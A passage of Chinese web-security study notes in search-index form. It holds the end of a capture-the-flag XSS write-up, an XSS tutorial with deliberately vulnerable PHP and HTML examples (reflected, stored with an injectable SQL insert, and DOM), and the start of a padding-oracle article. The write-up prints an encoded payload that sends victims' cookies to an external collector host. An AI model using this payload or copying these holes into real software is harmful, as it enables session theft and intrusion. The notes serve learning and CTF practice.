<p>\u8fd8\u6709URL\u53ef\u4ee5\u63d0\u4ea4</p> <p>\u81f3\u4e8e\u4e0b\u9762\u7684\u4f1a\u7528\u5230\u811a\u672c\uff1amd5\u622a\u65ad\u7206\u7834</p> <p>\u7ed3\u5408\u6807\u9898\u518d\u770b\u770b\u8fd9\u4e24\u4e2a\u9875\u9762\uff0c\u6295\u7a3f\u9875\u9762\u662f\u7528\u6765\u653eXSS\u7684\uff0c\u7136\u540e\u5728\u53cd\u9988\u7ed9\u7ba1\u7406\u5458\u8fd9\u6837\u6211\u4eec\u5c31\u80fd\u62ff\u5230\u7ba1\u7406\u5458\u7684cookie\uff0c\u56e0\u4e3a\u8fd9\u91cc\u662f\u5185\u7f51\u73af\u5883\uff0c\u6240\u4ee5\u53ea\u80fd\u53bbhttp://xss.buuoj.cn\u6ce8\u518c\u8d26\u53f7\u6765\u63a5\u6536cookie\u3002</p> <p>\u7ecf\u8fc7\u6d4b\u8bd5\u53d1\u73b0\u63d0\u4ea4\u7684\u5185\u5bb9\u90e8\u5206\u4f1a\u88ab\u8f6c\u4e49\uff0c\u53ef\u4ee5\u5148\u5c06\u63d0\u4ea4\u7684\u5185\u5bb9\u7528HTML Markup\u8f6c\u4e2a\u7801\uff0c\u7136\u540e\u7528eval\u6765\u6267\u884cJS\u4ee3\u7801\uff0c\u800c\u4e14\u8fd9\u91cc\u9700\u8981\u7528window.location.href\u6765\u5237\u65b0\u9875\u9762\u81ea\u52a8\u89e6\u53d1\u3002</p> <p>markup\u8f6c\u7801\u811a\u672c</p> <pre><code>import markup\nxss =\"(function(){window.location.href='http://xss.buuoj.cn/index.php?do=api&amp;id=odd1Xf&amp;location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&amp;toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&amp;cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&amp;opener='+escape((function(){try{return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})();\"\noutput = \"\"\nfor c in xss:\n    output += \"&amp;#\" + str(ord(c))\nprint(\"&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34\" + output + \"&amp;#34&amp;#41&lt;/script&gt;\")\n</code></pre> <p>\u5728\u7f51\u7ad9\u4e0a\u63a5\u53d7\u5230\u5f39\u56de\u6765\u7684cookie\u540e\uff0c\u5229\u7528cookie\u767b\u5f55\uff0cOK</p> <p>\u540e\u9762\u8fd8\u6709\u4e2asql\u6ce8\u5165\uff0c\u4e0d\u8fc7\u6ca1\u8fc7\u6ee4\uff0c\u975e\u5e38\u7b80\u5355\u3002</p>"},{"location":"web_bak/XSS_CSS_CSP/xss/XSS/","title":"XSS","text":"<p>\u5176\u5b9e\u6211\u662f\u60f3\u548cCSRF\u653e\u5728\u4e00\u8d77\u7684\uff0c\u6bd5\u7adf\u5f88\u50cf</p>"},{"location":"web_bak/XSS_CSS_CSP/xss/XSS/#cross-site-scripting","title":"\u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff08Cross Site Scripting\uff09","text":"<p>\u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff08XSS\uff09\uff0c\u662f\u6700\u666e\u904d\u7684Web\u5e94\u7528\u5b89\u5168\u6f0f\u6d1e\u3002\u8fd9\u7c7b\u6f0f\u6d1e\u80fd\u591f\u4f7f\u5f97\u653b\u51fb\u8005\u5d4c\u5165\u6076\u610f\u811a\u672c\u4ee3\u7801\u5230\u6b63\u5e38\u7528\u6237\u4f1a\u8bbf\u95ee\u5230\u7684\u9875\u9762\u4e2d\uff0c\u5f53\u6b63\u5e38\u7528\u6237\u8bbf\u95ee\u8be5\u9875\u9762\u65f6\uff0c\u5219\u53ef\u5bfc\u81f4\u5d4c\u5165\u7684\u6076\u610f\u811a\u672c\u4ee3\u7801\u7684\u6267\u884c\uff0c\u4ece\u800c\u8fbe\u5230\u6076\u610f\u653b\u51fb\u7528\u6237\u7684\u76ee\u7684\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u6237\u5728\u6d4f\u89c8\u5668\u4e2d\u6267\u884c\u5176\u9884\u5b9a\u4e49\u7684\u6076\u610f\u811a\u672c\uff0c\u5176\u5bfc\u81f4\u7684\u5371\u5bb3\u53ef\u60f3\u800c\u77e5\uff0c\u5982\u52ab\u6301\u7528\u6237\u4f1a\u8bdd\uff0c\u63d2\u5165\u6076\u610f\u5185\u5bb9\u3001\u91cd\u5b9a\u5411\u7528\u6237\u3001\u4f7f\u7528\u6076\u610f\u8f6f\u4ef6\u52ab\u6301\u7528\u6237\u6d4f\u89c8\u5668\u3001\u7e41\u6b96XSS\u8815\u866b\uff0c\u751a\u81f3\u7834\u574f\u7f51\u7ad9\u3001\u4fee\u6539\u8def\u7531\u5668\u914d\u7f6e\u4fe1\u606f\u7b49\u3002</p> <p>\u4e5f\u6709\u4eba\u8bf4\u8fd9\u4e2a\u6f0f\u6d1e\u6316\u6398\u5c31\u662f\u770b\u4f60JS\u597d\u4e0d\u597d</p>"},{"location":"web_bak/XSS_CSS_CSP/xss/XSS/#_1","title":"\u539f\u7406","text":"<p>HTML\u662f\u4e00\u79cd\u8d85\u6587\u672c\u6807\u8bb0\u8bed\u8a00\uff0c\u901a\u8fc7\u5c06\u4e00\u4e9b\u5b57\u7b26\u7279\u6b8a\u5730\u5bf9\u5f85\u6765\u533a\u522b\u6587\u672c\u548c\u6807\u8bb0\uff0c\u4f8b\u5982\uff0c\u5c0f\u4e8e\u7b26\u53f7\uff08&lt;\uff09\u88ab\u770b\u4f5c\u662fHTML\u6807\u7b7e\u7684\u5f00\u59cb\uff0c\u4e0e\u4e4b\u95f4\u7684\u5b57\u7b26\u662f\u9875\u9762\u7684\u6807\u9898\u7b49\u7b49\u3002\u5f53\u52a8\u6001\u9875\u9762\u4e2d\u63d2\u5165\u7684\u5185\u5bb9\u542b\u6709\u8fd9\u4e9b\u7279\u6b8a\u5b57\u7b26\uff08\u5982&lt;\uff09\u65f6\uff0c\u7528\u6237\u6d4f\u89c8\u5668\u4f1a\u5c06\u5176\u8bef\u8ba4\u4e3a\u662f\u63d2\u5165\u4e86HTML\u6807\u7b7e\uff0c\u5f53\u8fd9\u4e9bHTML\u6807\u7b7e\u5f15\u5165\u4e86\u4e00\u6bb5JavaScript\u811a\u672c\u65f6\uff0c\u8fd9\u4e9b\u811a\u672c\u7a0b\u5e8f\u5c31\u5c06\u4f1a\u5728\u7528\u6237\u6d4f\u89c8\u5668\u4e2d\u6267\u884c\u3002\u6240\u4ee5\uff0c\u5f53\u8fd9\u4e9b\u7279\u6b8a\u5b57\u7b26\u4e0d\u80fd\u88ab\u52a8\u6001\u9875\u9762\u68c0\u67e5\u6216\u68c0\u67e5\u51fa\u73b0\u5931\u8bef\u65f6\uff0c\u5c31\u5c06\u4f1a\u4ea7\u751fXSS\u6f0f\u6d1e\u3002</p>"},{"location":"web_bak/XSS_CSS_CSP/xss/XSS/#_2","title":"\u7c7b\u578b","text":"<p>\u4ece\u653b\u51fb\u4ee3\u7801\u7684\u5de5\u4f5c\u65b9\u5f0f\u53ef\u4ee5\u5206\u4e3a\u4e09\u4e2a\u7c7b\u578b\uff1a</p> <p>\uff081\uff09\u6301\u4e45\u578b\u8de8\u7ad9\uff1a\u6700\u76f4\u63a5\u7684\u5371\u5bb3\u7c7b\u578b\uff0c\u8de8\u7ad9\u4ee3\u7801\u5b58\u50a8\u5728\u670d\u52a1\u5668\uff08\u6570\u636e\u5e93\uff09\u3002</p> <p>\uff082\uff09\u975e\u6301\u4e45\u578b\u8de8\u7ad9\uff1a\u53cd\u5c04\u578b\u8de8\u7ad9\u811a\u672c\u6f0f\u6d1e\uff0c\u6700\u666e\u904d\u7684\u7c7b\u578b\u3002\u7528\u6237\u8bbf\u95ee\u670d\u52a1\u5668-\u8de8\u7ad9\u94fe\u63a5-\u8fd4\u56de\u8de8\u7ad9\u4ee3\u7801\u3002</p> <p>\uff083\uff09DOM\u8de8\u7ad9\uff08DOM XSS\uff09\uff1aDOM\uff08document object model\u6587\u6863\u5bf9\u8c61\u6a21\u578b\uff09\uff0c\u5ba2\u6237\u7aef\u811a\u672c\u5904\u7406\u903b\u8f91\u5bfc\u81f4\u7684\u5b89\u5168\u95ee\u9898\u3002</p> <p>\u57fa\u4e8eDOM\u7684XSS\u6f0f\u6d1e\u662f\u6307\u53d7\u5bb3\u8005\u7aef\u7684\u7f51\u9875\u811a\u672c\u5728\u4fee\u6539\u672c\u5730\u9875\u9762DOM\u73af\u5883\u65f6\u672a\u8fdb\u884c\u5408\u7406\u7684\u5904\u7f6e\uff0c\u800c\u4f7f\u5f97\u653b\u51fb\u811a\u672c\u88ab\u6267\u884c\u3002\u5728\u6574\u4e2a\u653b\u51fb\u8fc7\u7a0b\u4e2d\uff0c\u670d\u52a1\u5668\u54cd\u5e94\u7684\u9875\u9762\u5e76\u6ca1\u6709\u53d1\u751f\u53d8\u5316\uff0c\u5f15\u8d77\u5ba2\u6237\u7aef\u811a\u672c\u6267\u884c\u7ed3\u679c\u5dee\u5f02\u7684\u539f\u56e0\u662f\u5bf9\u672c\u5730DOM\u7684\u6076\u610f\u7be1\u6539\u5229\u7528\u3002</p>"},{"location":"web_bak/XSS_CSS_CSP/xss/XSS/#_3","title":"\u653b\u51fb\u65b9\u5f0f","text":"<p>\u5e38\u7528\u7684XSS\u653b\u51fb\u624b\u6bb5\u548c\u76ee\u7684\u6709\uff1a</p> <p>1\u3001\u76d7\u7528cookie\uff0c\u83b7\u53d6\u654f\u611f\u4fe1\u606f\u3002</p> <p>2\u3001\u5229\u7528\u690d\u5165Flash\uff0c\u901a\u8fc7crossdomain\u6743\u9650\u8bbe\u7f6e\u8fdb\u4e00\u6b65\u83b7\u53d6\u66f4\u9ad8\u6743\u9650\uff1b\u6216\u8005\u5229\u7528Java\u7b49\u5f97\u5230\u7c7b\u4f3c\u7684\u64cd\u4f5c\u3002</p> <p>3\u3001\u5229\u7528iframe\u3001frame\u3001XMLHttpRequest\u6216\u4e0a\u8ff0Flash\u7b49\u65b9\u5f0f\uff0c\u4ee5\uff08\u88ab\u653b\u51fb\uff09\u7528\u6237\u7684\u8eab\u4efd\u6267\u884c\u4e00\u4e9b\u7ba1\u7406\u52a8\u4f5c\uff0c\u6216\u6267\u884c\u4e00\u4e9b\u4e00\u822c\u7684\u5982\u53d1\u5fae\u535a\u3001\u52a0\u597d\u53cb\u3001\u53d1\u79c1\u4fe1\u7b49\u64cd\u4f5c\u3002</p> <p>4\u3001\u5229\u7528\u53ef\u88ab\u653b\u51fb\u7684\u57df\u53d7\u5230\u5176\u4ed6\u57df\u4fe1\u4efb\u7684\u7279\u70b9\uff0c\u4ee5\u53d7\u4fe1\u4efb\u6765\u6e90\u7684\u8eab\u4efd\u8bf7\u6c42\u4e00\u4e9b\u5e73\u65f6\u4e0d\u5141\u8bb8\u7684\u64cd\u4f5c\uff0c\u5982\u8fdb\u884c\u4e0d\u5f53\u7684\u6295\u7968\u6d3b\u52a8\u3002</p> <p>5\u3001\u5728\u8bbf\u95ee\u91cf\u6781\u5927\u7684\u4e00\u4e9b\u9875\u9762\u4e0a\u7684XSS\u53ef\u4ee5\u653b\u51fb\u4e00\u4e9b\u5c0f\u578b\u7f51\u7ad9\uff0c\u5b9e\u73b0DDoS\u653b\u51fb\u7684\u6548\u679c\u3002</p>"},{"location":"web_bak/XSS_CSS_CSP/xss/XSS/#_4","title":"XSS","text":"<p>\uff08\u4ee5\u4e0a\u6458\u81ea\u767e\u5ea6\u767e\u79d1\uff09</p> <p>\u60f3\u8c61\u4e00\u4e0b\uff0c\u5f53\u6709\u4e00\u5929\u4f60\u6b63\u5728\u7f51\u5361\u5feb\u4e50\u7684\u51b2\u7740\u6d6a\uff0c\u521a\u521a\u53d1\u5230\u5de5\u8d44\u7684\u4f60\u767b\u5f55\u4e86XX\u94f6\u884c\u7684\u7f51\u7ad9\uff0c\u7f51\u9875\u53f3\u4e0b\u89d2\u7a81\u7136\u5f39\u51fa\u4e00\u4e2a\u4e0d\u8d77\u773c\u7684\u5f39\u6846\uff0c\u4f60\u70b9\u51fb\u5b83\u60f3\u628a\u5b83\u5173\u6389\u7ed3\u679c\u4e0d\u5c0f\u5fc3\u6253\u5f00\u3002\u7136\u540e\u7a81\u7136\u4f20\u51fa\u6d88\u606f\uff1a\u4f60\u5df2\u8f6c\u8d26XXX\u5143.......</p> <p>\u603b\u7684\u6765\u8bf4XSS\u6f0f\u6d1e\u5371\u5bb3\u6027\u8fd8\u662f\u86ee\u5927\u7684\u3002\u540c\u6837\u7684\uff0c\u6211\u4eec\u4e5f\u9762\u4e34\u7740\u5f3a\u5927\u7684\u5404\u79cd\u8fc7\u6ee4\u624b\u6bb5\u3002</p> <p>\u5982\u4f55\u7ed5\u8fc7\u8fd9\u4e9b\u624b\u6bb5\u662f\u6211\u4eec\u7684\u5b66\u4e60\u7684\u76ee\u7684\u3002</p> <p></p>"},{"location":"web_bak/XSS_CSS_CSP/xss/XSS/#xss_1","title":"XSS\u7684\u4e09\u79cd\u65b9\u6cd5","text":"<p>XSS\u7684\u7b80\u4ecb</p> <p>\u60f3\u5b66\u4e60\u7684\u8bdd\u62ffDVWA\u53ef\u4ee5\u81ea\u5df1\u6162\u6162\u8bd5</p>"},{"location":"web_bak/XSS_CSS_CSP/xss/XSS/#xss_2","title":"\u53cd\u5c04\u578bxss","text":"<p>\u53cd\u5c04XSS\u662fXSS\u5206\u7c7b\u4e2d\u6700\u591a\u7684\uff0c\u4ed6\u4eec\u539f\u7406\u662f\u4e0b\u9762\u8fd9\u6837\uff1a</p> <p>Hacker\u2014\u2014\u53d1\u73b0\u5b58\u5728\u53cd\u5c04XSS\u7684URL\u2014\u2014\u6839\u636e\u8f93\u51fa\u70b9\u7684\u73af\u5883\u6784\u9020XSS\u4ee3\u7801\u2014\u2014\u8fdb\u884c\u7f16\u7801\u3001\u7f29\u77ed(\u53ef\u6709\u53ef\u65e0\uff0c\u662f\u4e3a\u4e86\u589e\u52a0\u8ff7\u60d1\u6027)\u2014\u2014\u53d1\u9001\u7ed9\u53d7\u5bb3\u4eba\u2014\u2014\u53d7\u5bb3\u6253\u5f00\u540e\uff0c\u6267\u884cXSS\u4ee3\u7801\u2014\u2014\u5b8c\u6210hacker\u60f3\u8981\u7684\u529f\u80fd(\u83b7\u53d6cookies\u3001url\u3001\u6d4f\u89c8\u5668\u4fe1\u606f\u3001IP\u7b49\u7b49)</p> <p>\u6253\u4e2a\u6bd4\u65b9\uff1a</p> <p>A\u7f51\u7ad9\u6709\u4e2aXSS\uff0c\u9ed1\u5ba2\u5199\u4e86\u4e00\u4e2aB\u7f51\u7ad9\uff0c\u53d7\u5bb3\u8005\u8bbf\u95eeB\u7f51\u7ad9\u7684\u65f6\u5019\u4f1a\u8df3\u5230A\u7f51\u7ad9\u5e76\u4e14\u8fd4\u56de\u4fe1\u606f\u7ed9\u9ed1\u5ba2\u3002</p>"},{"location":"web_bak/XSS_CSS_CSP/xss/XSS/#xss_3","title":"\u5b58\u50a8\u578bXSS","text":"<p>\u5229\u7528\u90fd\u662f\u63d2\u5165\u4ee3\u7801\u5230HTML\u4e4b\u4e2d\uff0c\u53cd\u5c04\u578b\u662f\u4e00\u90e8\u5206\uff0c\u7b49\u7740\u9493\u9c7c\u3002</p> <p>\u5b58\u50a8\u578b\u5c31\u7b49\u7740\u522b\u4eba\u70b9\u8fd9\u4e2a\u7f51\u9875\u5c31\u884c\u4e86\u3002</p>"},{"location":"web_bak/XSS_CSS_CSP/xss/XSS/#domxss","title":"DOM\u578bXSS","text":"<p>DOM\uff0c\u5168\u79f0Document Object Model\uff0c\u662f\u4e00\u4e2a\u5e73\u53f0\u548c\u8bed\u8a00\u90fd\u4e2d\u7acb\u7684\u63a5\u53e3\uff0c\u53ef\u4ee5\u4f7f\u7a0b\u5e8f\u548c\u811a\u672c\u80fd\u591f\u52a8\u6001\u8bbf\u95ee\u548c\u66f4\u65b0\u6587\u6863\u7684\u5185\u5bb9\u3001\u7ed3\u6784\u4ee5\u53ca\u6837\u5f0f\u3002</p> <p></p> <p>DOM\u578bXSS\u5176\u5b9e\u662f\u4e00\u79cd\u7279\u6b8a\u7c7b\u578b\u7684\u53cd\u5c04\u578bXSS\uff0c\u5b83\u662f\u57fa\u4e8eDOM\u6587\u6863\u5bf9\u8c61\u6a21\u578b\u7684\u4e00\u79cd\u6f0f\u6d1e\u3002\u5728\u7f51\u7ad9\u9875\u9762\u4e2d\u6709\u8bb8\u591a\u9875\u9762\u7684\u5143\u7d20\uff0c\u5f53\u9875\u9762\u5230\u8fbe\u6d4f\u89c8\u5668\u65f6\u6d4f\u89c8\u5668\u4f1a\u4e3a\u9875\u9762\u521b\u5efa\u4e00\u4e2a\u9876\u7ea7\u7684Document object\u6587\u6863\u5bf9\u8c61\uff0c\u63a5\u7740\u751f\u6210\u5404\u4e2a\u5b50\u6587\u6863\u5bf9\u8c61\uff0c\u6bcf\u4e2a\u9875\u9762\u5143\u7d20\u5bf9\u5e94\u4e00\u4e2a\u6587\u6863\u5bf9\u8c61\uff0c\u6bcf\u4e2a\u6587\u6863\u5bf9\u8c61\u5305\u542b\u5c5e\u6027\u3001\u65b9\u6cd5\u548c\u4e8b\u4ef6\u3002\u53ef\u4ee5\u901a\u8fc7JS\u811a\u672c\u5bf9\u6587\u6863\u5bf9\u8c61\u8fdb\u884c\u7f16\u8f91\u4ece\u800c\u4fee\u6539\u9875\u9762\u7684\u5143\u7d20\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5ba2\u6237\u7aef\u7684\u811a\u672c\u7a0b\u5e8f\u53ef\u4ee5\u901a\u8fc7DOM\u6765\u52a8\u6001\u4fee\u6539\u9875\u9762\u5185\u5bb9\uff0c\u4ece\u5ba2\u6237\u7aef\u83b7\u53d6DOM\u4e2d\u7684\u6570\u636e\u5e76\u5728\u672c\u5730\u6267\u884c\u3002\u57fa\u4e8e\u8fd9\u4e2a\u7279\u6027\uff0c\u5c31\u53ef\u4ee5\u5229\u7528JS\u811a\u672c\u6765\u5b9e\u73b0XSS\u6f0f\u6d1e\u7684\u5229\u7528\u3002</p> <p>\u5173\u4e8eDOM\u578bXSS</p> <p>\u5b66\u53f7\uff1a16030140019 \u59d3\u540d: \u83ab\u76ca\u5f70 \u3010\u5d4c\u725b\u5bfc\u8bfb\u3011\uff1aDOM\uff0c\u5168\u79f0Document Object Model\uff0c\u662f\u4e00\u4e2a\u5e73\u53f0\u548c\u8bed\u8a00\u90fd\u4e2d\u7acb\u7684\u63a5\u53e3\uff0c\u53ef\u4ee5\u4f7f\u7a0b\u5e8f\u548c\u811a\u672c\u80fd\u591f\u52a8\u6001\u8bbf\u95ee...</p> <p>image.vnd.microsoft.icon</p> <p>[https://www.jianshu.com/p/190dedd585f2](</p>"},{"location":"web_bak/XSS_CSS_CSP/xss/XSS/#_5","title":"\u5229\u7528\u4e3e\u4f8b","text":""},{"location":"web_bak/XSS_CSS_CSP/xss/XSS/#_6","title":"\u53cd\u5c04","text":"<p>\u7ed9\u51fa\u6e90\u7801</p> <pre><code>//\u524d\u7aef 1.html\uff1a\n&lt;html&gt;\n&lt;head lang=\"en\"&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;title&gt;\u53cd\u5c04\u578bXSS&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;form action=\"action.php\" method=\"post\"&gt;\n        &lt;input type=\"text\" name=\"name\" /&gt;\n        &lt;input type=\"submit\" value=\"\u63d0\u4ea4\"&gt;\n    &lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n//\u540e\u7aef action.php\uff1a\n&lt;?php\n    $name=$_POST[\"name\"]; \n    echo $name;\n?&gt;\n</code></pre> <p>\u8fd9\u91cc\u6709\u4e00\u4e2a\u7528\u6237\u63d0\u4ea4\u7684\u9875\u9762\uff0c\u7528\u6237\u53ef\u4ee5\u5728\u6b64\u63d0\u4ea4\u6570\u636e\uff0c\u6570\u636e\u63d0\u4ea4\u4e4b\u540e\u7ed9\u540e\u53f0\u5904\u7406</p> <p></p> <p>\u6240\u4ee5\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u8f93\u5165\u6846\u4e2d\u63d0\u4ea4\u6570\u636e\uff1a\uff0c\u770b\u770b\u4f1a\u6709\u4ec0\u4e48\u53cd\u5e94</p> <p></p> <p>\u9875\u9762\u76f4\u63a5\u5f39\u51fa\u4e86hack\u7684\u9875\u9762\uff0c\u53ef\u4ee5\u770b\u5230\uff0c\u6211\u4eec\u63d2\u5165\u7684\u8bed\u53e5\u5df2\u7ecf\u88ab\u9875\u9762\u7ed9\u6267\u884c\u4e86\u3002</p> <p>\u8fd9\u5c31\u662f\u6700\u57fa\u672c\u7684\u53cd\u5c04\u578b\u7684XSS\u6f0f\u6d1e\uff0c\u8fd9\u79cd\u6f0f\u6d1e\u6570\u636e\u6d41\u5411\u662f\uff1a\u524d\u7aef\u2192\u540e\u7aef\u2192\u524d\u7aef</p>"},{"location":"web_bak/XSS_CSS_CSP/xss/XSS/#_7","title":"\u5b58\u50a8","text":"<pre><code>//\u524d\u7aef\uff1a2.html\n&lt;html&gt;\n&lt;head lang=\"en\"&gt;\n&lt;meta charset=\"UTF-8\"&gt;\n&lt;title&gt;\u5b58\u50a8\u578bXSS&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;form action=\"action2.php\" method=\"post\"&gt;\n\u8f93\u5165\u4f60\u7684ID\uff1a  &lt;input type=\"text\" name=\"id\" /&gt; &lt;br/&gt;\n\u8f93\u5165\u4f60\u7684Name\uff1a&lt;input type=\"text\" name=\"name\" /&gt; &lt;br/&gt;\n&lt;input type=\"submit\" value=\"\u63d0\u4ea4\"&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n//\u540e\u7aef\uff1aaction2.php\n&lt;?php\n$id=$_POST[\"id\"];\n$name=$_POST[\"name\"];\nmysql_connect(\"localhost\",\"root\",\"root\");\nmysql_select_db(\"test\");\n\n$sql=\"insert into xss value ($id,'$name')\";\n$result=mysql_query($sql);\n?&gt;\n//\u4f9b\u5176\u4ed6\u7528\u6237\u8bbf\u95ee\u9875\u9762\uff1ashow2.php\n&lt;?php\nmysql_connect(\"localhost\",\"root\",\"root\");\nmysql_select_db(\"test\");\n$sql=\"select * from xss where id=1\";\n$result=mysql_query($sql);\nwhile($row=mysql_fetch_array($result)){\necho $row['name'];\n}\n?&gt;\n</code></pre> <p>\u8fd9\u91cc\u6709\u4e00\u4e2a\u7528\u6237\u63d0\u4ea4\u7684\u9875\u9762\uff0c\u6570\u636e\u63d0\u4ea4\u7ed9\u540e\u7aef\u4e4b\u540e\uff0c\u540e\u7aef\u5b58\u50a8\u5728\u6570\u636e\u5e93\u4e2d\u3002\u7136\u540e\u5f53\u5176\u4ed6\u7528\u6237\u8bbf\u95ee\u53e6\u4e00\u4e2a\u9875\u9762\u7684\u65f6\u5019\uff0c\u540e\u7aef\u8c03\u51fa\u8be5\u6570\u636e\uff0c\u663e\u793a\u7ed9\u53e6\u4e00\u4e2a\u7528\u6237\uff0cXSS\u4ee3\u7801\u5c31\u88ab\u6267\u884c\u4e86\u3002</p> <p></p> <p>\u6211\u4eec\u8f93\u51651\u548c\uff0c\u6ce8\u610f\uff0c\u8fd9\u91cc\u7684hack\u7684\u5355\u5f15\u53f7\u8981\u8fdb\u884c\u8f6c\u4e49\uff0c\u56e0\u4e3asql\u8bed\u53e5\u4e2d\u7684$name\u662f\u5355\u5f15\u53f7\u7684\uff0c\u6240\u4ee5\u8fd9\u91cc\u4e0d\u8f6c\u4e49\u7684\u8bdd\u5c31\u4f1a\u95ed\u5408sql\u8bed\u53e5\u4e2d\u7684\u5355\u5f15\u53f7\u3002\u4e0d\u7136\u6ce8\u5165\u4e0d\u8fdb\u53bb\u3002\u63d0\u4ea4\u4e86\u4e4b\u540e\uff0c\u6211\u4eec\u770b\u770b\u6570\u636e\u5e93</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u6211\u4eec\u7684XSS\u8bed\u53e5\u5df2\u7ecf\u63d2\u5165\u5230\u6570\u636e\u5e93\u4e2d\u4e86</p> <p>\u7136\u540e\u5f53\u5176\u4ed6\u7528\u6237\u8bbf\u95ee show2.php \u9875\u9762\u65f6\uff0c\u6211\u4eec\u63d2\u5165\u7684XSS\u4ee3\u7801\u5c31\u6267\u884c\u4e86\u3002</p> <p>\u5b58\u50a8\u578bXSS\u7684\u6570\u636e\u6d41\u5411\u662f\uff1a\u524d\u7aef\u2192\u540e\u7aef\u2192\u6570\u636e\u5e93\u2192\u540e\u7aef\u2192\u524d\u7aef</p> <p></p>"},{"location":"web_bak/XSS_CSS_CSP/xss/XSS/#dom","title":"DOM","text":"<pre><code>// \u524d\u7aef3.html\n&lt;html&gt;\n&lt;head lang=\"en\"&gt;\n&lt;meta charset=\"UTF-8\"&gt;\n&lt;title&gt;DOM\u578bXSS&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;form action=\"action3.php\" method=\"post\"&gt;\n&lt;input type=\"text\" name=\"name\" /&gt;\n&lt;input type=\"submit\" value=\"\u63d0\u4ea4\"&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n// \u540e\u7aefaction3.php\n&lt;?php\n$name=$_POST[\"name\"];\n?&gt;\n&lt;input id=\"text\" type=\"text\" value=\"&lt;?php echo $name; ?&gt;\"/&gt;\n&lt;div id=\"print\"&gt;&lt;/div&gt;\n&lt;script type=\"text/javascript\"&gt;\nvar text=document.getElementById(\"text\");\nvar print=document.getElementById(\"print\");\nprint.innerHTML=text.value;  // \u83b7\u53d6 text\u7684\u503c\uff0c\u5e76\u4e14\u8f93\u51fa\u5728print\u5185\u3002\u8fd9\u91cc\u662f\u5bfc\u81f4xss\u7684\u4e3b\u8981\u539f\u56e0\u3002\n&lt;/script&gt;\n</code></pre> <p>\u8fd9\u91cc\u6709\u4e00\u4e2a\u7528\u6237\u63d0\u4ea4\u7684\u9875\u9762\uff0c\u7528\u6237\u53ef\u4ee5\u5728\u6b64\u63d0\u4ea4\u6570\u636e\uff0c\u6570\u636e\u63d0\u4ea4\u4e4b\u540e\u7ed9\u540e\u53f0\u5904\u7406</p> <p></p> <p>\u6211\u4eec\u53ef\u4ee5\u8f93\u5165\uff0c\u7136\u540e\u770b\u770b\u9875\u9762\u7684\u53d8\u5316</p> <p></p> <p>\u9875\u9762\u76f4\u63a5\u5f39\u51fa\u4e86 hack \u7684\u9875\u9762\uff0c\u53ef\u4ee5\u770b\u5230\uff0c\u6211\u4eec\u63d2\u5165\u7684\u8bed\u53e5\u5df2\u7ecf\u88ab\u9875\u9762\u7ed9\u6267\u884c\u4e86\u3002</p> <p>\u8fd9\u5c31\u662fDOM\u578bXSS\u6f0f\u6d1e\uff0c\u8fd9\u79cd\u6f0f\u6d1e\u6570\u636e\u6d41\u5411\u662f\uff1a\u524d\u7aef\u2192\u6d4f\u89c8\u5668</p> <p>\u5f00\u62d3\u4e00\u4e0b\u8111\u6d1e\uff1aDOM\u578b\u7c7b\u6bd4\u4e00\u4e2a\u89e3\u6790\u6a21\u677f\uff0c\u4f60\u8f93\u5165\u6570\u636e\u76f4\u63a5\u7ed9\u4f60\u89e3\u6790\u4e86\u3002</p>"},{"location":"web_bak/crypto/CBC_Padding_Oracle%E6%94%BB%E5%87%BB/","title":"CBC Padding Oracle\u653b\u51fb","text":"<p>\u539f\u6587\uff1a</p> <p>https://blog.csdn.net/weixin_44843084/article/details/106736385Padding</p> <p>Oracle Attack\u80cc\u540e\u7684\u5173\u952e\u6027\u6982\u5ff5\u4fbf\u662f\u52a0/\u89e3\u5bc6\u65f6\u7684\u586b\u5145\uff08Padding\uff09\u3002\u660e\u6587\u4fe1\u606f\u53ef\u4ee5\u662f\u4efb\u610f\u957f\u5ea6\uff0c\u4f46\u662f\u5757\u72b6\u52a0\u5bc6\u7b97\u6cd5\u9700\u8981\u6240\u6709\u7684\u4fe1\u606f\u90fd\u7531\u4e00\u5b9a\u6570\u91cf\u7684\u6570\u636e\u5757\u7ec4\u6210\u3002\u4e3a\u4e86\u6ee1\u8db3\u8fd9\u6837\u7684\u9700\u6c42\uff0c\u4fbf\u9700\u8981\u5bf9\u660e\u6587\u8fdb\u884c\u586b\u5145\uff0c\u8fd9\u6837\u4fbf\u53ef\u4ee5\u5c06\u5b83\u5206\u5272\u4e3a\u5b8c\u6574\u7684\u6570\u636e\u5757\u3002</p> <p>\u52a0\u5bc6\u65f6\u53ef\u4ee5\u4f7f\u7528\u591a\u79cd\u586b\u5145\u89c4\u5219\uff0c\u4f46\u6700\u5e38\u89c1\u7684\u586b\u5145\u65b9\u5f0f\u4e4b\u4e00\u662f\u5728PKCS#5\u6807\u51c6\u4e2d\u5b9a\u4e49\u7684\u89c4\u5219\u3002PCKS#5\u7684\u586b\u5145\u65b9\u5f0f\u4e3a\uff1a\u660e\u6587\u7684\u6700\u540e\u4e00\u4e2a\u6570\u636e\u5757\u5305\u542bN\u4e2a\u5b57\u8282\u7684\u586b\u5145\u6570\u636e\uff08N\u53d6\u51b3\u4e8e\u660e\u6587\u6700\u540e\u4e00\u5757\u7684\u6570\u636e\u957f\u5ea6\uff09\u3002\u4e0b\u56fe\u662f\u4e00\u4e9b\u793a\u4f8b\uff0c\u5c55\u793a\u4e86\u4e0d\u540c\u957f\u5ea6\u7684\u5355\u8bcd\uff08FIG\u3001BANANA\u3001AVOCADO\u3001PLANTAIN\u3001PASSIONFRUIT\uff09\u4ee5\u53ca\u5b83\u4eec\